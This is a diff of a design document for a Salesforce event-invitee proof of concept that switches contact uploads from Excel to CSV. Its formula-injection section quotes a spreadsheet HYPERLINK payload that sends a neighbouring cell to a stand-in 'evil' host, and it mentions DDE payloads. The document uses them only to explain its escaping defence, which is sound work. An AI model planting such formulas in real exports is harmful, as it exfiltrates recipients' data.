@@ -12,13 +12,13 @@ see *Screen 5 — Export* for the substance and *Deliverables* for the added com
 
 ## Problem Statement
 
-Account Managers (AMs, mostly US/EU-based) collect external contact lists (Excel) from conferences and other systems. Today there is no structured way to: (1) reconcile those lists against existing Salesforce Contacts, (2) assemble an event invitee list from multiple AMs' accounts, (3) get per-contact sign-off from each Account Owner (the AM's manager/director), and (4) export the approved list. The PoC demonstrates this complete workflow inside the company's Salesforce Sandbox, on top of existing Account and Contact objects.
+Account Managers (AMs, mostly US/EU-based) collect external contact lists (CSV) from conferences and other systems. Today there is no structured way to: (1) reconcile those lists against existing Salesforce Contacts, (2) assemble an event invitee list from multiple AMs' accounts, (3) get per-contact sign-off from each Account Owner (the AM's manager/director), and (4) export the approved list. The PoC demonstrates this complete workflow inside the company's Salesforce Sandbox, on top of existing Account and Contact objects.
 
 **Demo audience:** marketing/sales AM colleagues. The "whoa" moment is operational: batch selection, one-click submission, and a clean bulk-approval experience — minimal manual work end to end.
 
 ## What Makes This Cool
 
-- **Diff-preview import**: upload an .xlsx and instantly see New / Changed / Unchanged / Company-change rows before anything touches the database — like a "git diff" for contact data.
+- **Diff-preview import**: upload a .csv and instantly see New / Changed / Unchanged / Company-change rows before anything touches the database — like a "git diff" for contact data.
 - **Multi-AM collaboration on one Event**: every AM adds contacts from their own accounts; batches are independent, nobody blocks anybody.
 - **Approval that respects org structure**: each Account Owner sees only contacts under their accounts, with Select All → Approve in two taps, on desktop or the Salesforce Mobile App.
 
@@ -26,7 +26,7 @@ Account Managers (AMs, mostly US/EU-based) collect external contact lists (Excel
 
 - Company Sandbox; existing Account/Contact data must not be restructured.
 - UI entirely in **English** (US/EU users). Demo data uses Western names/companies.
-- Upload format is **Excel (.xlsx)**, not CSV.
+- Upload format is **CSV (.csv)**.
 - Time-boxed PoC: happy path + demo-visible edge cases only; production hardening (bulk limits, i18n, granular FLS) out of scope.
 - Mobile approval = LWC running inside the standard **Salesforce Mobile App** (no native iOS development).
 
@@ -94,7 +94,7 @@ Event_Invitee__c  (junction; Master-Detail → Marketing_Event__c)
 
 ### Screen 1 — Import External Contact List (LWC wizard, App page)
 
-1. **Upload**: `lightning-input type="file"` (accepting `.xlsx`) + `FileReader` — NOT `lightning-file-upload`, which uploads straight to ContentVersion and never exposes the raw File to JS. Parsed **client-side** with SheetJS (community edition, pinned version, uploaded as a Static Resource; requires Lightning Web Security — see Dependencies) → JSON rows. Expected columns: First Name, Last Name, Email, Title, Company, Mobile (header row auto-detected, case-insensitive). Rows within the file are de-duplicated by Email before preview (last occurrence wins).
+1. **Upload**: `lightning-input type="file"` (accepting `.csv`) + `FileReader` — NOT `lightning-file-upload`, which uploads straight to ContentVersion and never exposes the raw File to JS. Parsed **client-side** with a minimal RFC 4180 CSV parser (quoted fields, `""` escapes, CRLF/LF rows) built into the LWC → rows. Expected columns: First Name, Last Name, Email, Title, Company, Mobile (header row auto-detected, case-insensitive). Rows within the file are de-duplicated by Email before preview (last occurrence wins).
 2. **Preview**: Apex `ContactImportController.previewMatches(rows)` matches by Email (case-insensitive) against Contact.Email and classifies each row:
    - **New** — email not found ⇒ will create Contact (Account matched by exact Company name; unmatched Company ⇒ grouped under a "PoC Unassigned" bucket Account and flagged in the row for the demo).
    - **Update** — email found, Title/Mobile differ ⇒ will update those fields.
@@ -136,7 +136,7 @@ Both queries include **both Approved and Exported** rows, so re-export always re
 
 **Getting the file onto the user's machine intact** is its own small problem, handled once in the shared `c/csvDownload` module: rows are joined with CRLF (RFC 4180) and the Blob is prefixed with a UTF-8 BOM, without which desktop Excel decodes the file as the local ANSI codepage and mangles every non-ASCII name; the object URL is revoked on a later tick because revoking in the same tick as `click()` cancels the download in Safari and older Chrome. The import wizard's company-change manual-review list downloads through the same module.
 
-**CSV formula injection.** Every exported value is data a user can set — a Contact Title, an Account name, an event name, or a cell from the uploaded .xlsx — so a value opening with `=`, `+`, `-`, `@` (or a tab/CR that Excel skips before them) would be *executed* when the file is opened: `=HYPERLINK("http://evil/?d="&A1,"Invoice")` exfiltrates the neighbouring row on a single click, and DDE payloads go further. Both writers — Apex `EventExportController.csvCell` and its client-side mirror in `c/csvDownload` — prefix such values with an apostrophe and always quote the result. The two implementations are deliberately parallel; they must stay in step. Accepted trade-off: the apostrophe is visible in some spreadsheet/import combinations, which is tolerable because every exported column is text — no legitimate value is a negative number the guard would damage.
+**CSV formula injection.** Every exported value is data a user can set — a Contact Title, an Account name, an event name, or a cell from the uploaded .csv — so a value opening with `=`, `+`, `-`, `@` (or a tab/CR that Excel skips before them) would be *executed* when the file is opened: `=HYPERLINK("http://evil/?d="&A1,"Invoice")` exfiltrates the neighbouring row on a single click, and DDE payloads go further. Both writers — Apex `EventExportController.csvCell` and its client-side mirror in `c/csvDownload` — prefix such values with an apostrophe and always quote the result. The two implementations are deliberately parallel; they must stay in step. Accepted trade-off: the apostrophe is visible in some spreadsheet/import combinations, which is tolerable because every exported column is text — no legitimate value is a negative number the guard would damage.
 
 ### Permissions (PoC-minimal)
 
@@ -146,11 +146,11 @@ Both export methods are `with sharing`, so the cross-event download is bounded b
 
 ### Deliverables / repo layout
 
-SFDX project in `salesforce_event_mgmt/` (force-app structure): 2 custom objects + fields, **4 LWCs** (import wizard — app page; contact selector — event record page; approval console — event record page; approved exports — app page) plus `c/csvDownload`, a JS-only bundle both download paths import so the BOM/CRLF/revoke handling lives in one place; 4 Apex controllers and 1 notification/decision service (+ tests), 1 static resource (SheetJS, pinned version), **1 Flow** (submit notification; completion notification lives in the Apex decision service), 2 app pages (`Import_Contacts`, `Approved_Exports` flexipages + tabs), 2 permission sets, demo seed-data script (`scripts/seed-demo-data.apex` with Western-name sample Accounts/Contacts incl. the "PoC Unassigned" bucket Account), deploy instructions in README. Screen 2 (event creation) is a standard record form with a curated layout — not an LWC.
+SFDX project in `salesforce_event_mgmt/` (force-app structure): 2 custom objects + fields, **4 LWCs** (import wizard — app page; contact selector — event record page; approval console — event record page; approved exports — app page) plus `c/csvDownload`, a JS-only bundle both download paths import so the BOM/CRLF/revoke handling lives in one place; 4 Apex controllers and 1 notification/decision service (+ tests), **1 Flow** (submit notification; completion notification lives in the Apex decision service), 2 app pages (`Import_Contacts`, `Approved_Exports` flexipages + tabs), 2 permission sets, demo seed-data script (`scripts/seed-demo-data.apex` with Western-name sample Accounts/Contacts incl. the "PoC Unassigned" bucket Account), deploy instructions in README. Screen 2 (event creation) is a standard record form with a curated layout — not an LWC.
 
 ## Open Questions
 
-1. Exact Excel column headers from the real source system (assumed: First Name, Last Name, Email, Title, Company, Mobile) — confirm with one real file before the demo.
+1. Exact CSV column headers from the real source system (assumed: First Name, Last Name, Email, Title, Company, Mobile) — confirm with one real file before the demo.
 2. "AM's accounts" definition in production (owner vs Account Team vs role hierarchy) — PoC uses owner + Account Team membership.
 3. Where the exported CSV goes next (mail-merge tool? event platform?) — affects export columns; PoC ships 6 columns per event, 8 across events (Event and Event Date lead). Related and still open: the file's Decided At column is GMT while the date-range pickers read in the user's timezone — if the downstream consumer parses that column, it may want local time or an ISO-8601 offset instead.
 4. Should Rejected invitees be re-submittable after edits? PoC: yes, via reset — re-adding a rejected contact resets the existing invitee row to Draft (see Screen 3); there is never a second row per Event+Contact.
@@ -158,7 +158,7 @@ SFDX project in `salesforce_event_mgmt/` (force-app structure): 2 custom objects
 ## Success Criteria
 
 Demo script runs end-to-end in the Sandbox without manual data fixes:
-1. Upload a 48-row .xlsx (seed file includes at least one missing-email and one duplicate-email row) → preview shows correct New/Update/Unchanged/Company-change/Skipped classification → apply updates Contacts.
+1. Upload a 48-row .csv (seed file includes at least one missing-email and one duplicate-email row) → preview shows correct New/Update/Unchanged/Company-change/Skipped classification → apply updates Contacts.
 2. AM creates an event; two different AM users each add their own contacts and submit; both Account Owners get notified.
 3. One Owner opens the console on desktop, the other in the Salesforce Mobile App (or phone-format preview); both Select All → Approve.
 4. Both AMs receive completion emails; the event shows correct roll-up counts; Export downloads a CSV with exactly the approved contacts.
@@ -170,16 +170,14 @@ Demo script runs end-to-end in the Sandbox without manual data fixes:
 ## Dependencies
 
 - Sandbox access with permission to deploy metadata (SFDX / Salesforce CLI, API access enabled).
-- **Lightning Web Security enabled** in the target Sandbox (Setup → Session Settings) — SheetJS breaks under legacy Locker Service; verify this before building Screen 1.
-- SheetJS community build (pinned version) uploadable as a Static Resource.
 - Two test users (AM role, Owner role) in the Sandbox for the multi-user demo.
-- One real anonymized .xlsx sample from the source system (nice-to-have; seed script otherwise).
+- One real anonymized .csv sample from the source system (nice-to-have; seed script otherwise).
 
 ## Next Steps
 
 1. Scaffold SFDX project + custom objects/fields/permission sets → verify: deploy to Sandbox succeeds.
 2. Seed demo data (Accounts with distinct Owners, Contacts, two AM users) → verify: Screen-3 grouping shows multiple owners.
-3. Build Screen 1 (SheetJS static resource + import wizard LWC + preview/apply Apex + tests) → verify: 48-row demo file classifies and applies correctly.
+3. Build Screen 1 (import wizard LWC with client-side CSV parsing + preview/apply Apex + tests) → verify: 48-row demo file classifies and applies correctly.
 4. Build Screen 3 selector + submit service + notifications → verify: two AMs' batches stay independent; owners notified.
 5. Build Screen 4 approval console (desktop + phone form factor) + completion notification → verify: select-all approve updates all rows and emails the right AM.
 6. Export button + Event roll-ups + record page assembly → verify: full demo script (Success Criteria) passes.
